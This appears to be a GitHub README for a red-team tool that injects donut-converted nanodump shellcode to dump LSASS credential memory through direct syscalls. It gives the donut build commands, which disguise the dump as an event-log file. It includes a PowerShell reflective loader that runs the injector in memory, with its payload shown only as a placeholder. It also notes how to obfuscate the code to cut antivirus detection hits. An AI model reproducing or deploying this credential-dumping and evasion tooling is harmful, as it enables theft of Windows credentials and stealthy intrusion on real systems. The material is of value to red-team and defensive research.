# sNanoDumpInject 

Minor syscall edit to [@s3cur3th1ssh1t](https://twitter.com/ShitSecure)'s [NanoDumpInject.cs](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs) from this [blog post](https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/).  

This repo contains code with donut'ed nanodump. DO NOT RUN random shellcodes inside random 0-star github repos. 

## Credits 

All credits to:
- @s3cur3th1ssh1t, @S4ntiagoP, @rastamouse, @ccob, 
- https://offensivedefence.co.uk/posts/Dynamic-syscalls/ 
- https://github.com/CCob/SharpBlock/blob/master/Program.cs#L37

Original Blog post & code: https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/

## Edits 

Added syscalls for the `Inject()` function. Small project to practice syscalls using DInvoke and creating a small syscall-only DInvoke.

## MISC/TODOs 

- Static Detection for DInvoke usually occurs in DInvoke strings. Use projects like [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) to reduce hits (13 -> 3)

- Learn what this PatchExit function is, and replace with syscalls as well? 

- ~~Using most up-to-date 06/12/2022 nanodump + donut doesn't work - the powershell process will crash upon `NtCreateThreadEx`. Need to find the correct commit for both nanodump + donut, `git reset --hard <hash>`, and retry creating donut'ed nanodump.~~

- Mystery solved, use Linux & MinGW for compiling and using donut + nanodump. Don't use Window's MSVC. The nanodump shellcode with up-to-date nanodump & donut works now!

## Things for myself 
```
# DONT USE WINDOW'S MSVC to compile donut & nanodump 

# use *nix instead!
make -f Makefile.mingw

./donut -i /opt/nanodump/dist/nanodump.x64.exe -b=1 -t -p "--valid --write C:\windows\temp\appevtlog.evtx" -o nano.bin -f 2; cat nano.bin | xclip -sel p
./donut -i /opt/nanodump/dist/nanodump.x64.exe -b=1 -t -p "--valid --write C:\windows\temp\appevtlog.evtx" -o nano.bin -f 2; cat nano.bin | xclip -sel c

# Reflective Loader by S3cur3th1ssh1t
function Invoke-NanoDump
{
<#
    .DESCRIPTION
        Execute NanoDump Shellcode to dump lsass.
        Main Credits to https://github.com/helpsystems/nanodump
        Author: Fabian Mosch, Twitter: @ShitSecure
    #>

Param
    (
        [switch]
        $valid
)

if ($valid)
{
    $choice = 1
}
else
{
    $choice = 2
}
    # Source code here: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs
	$base64binary = "<b64>"
	$RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [NanoDumpInject.Program]::Inject($choice)
  
}
```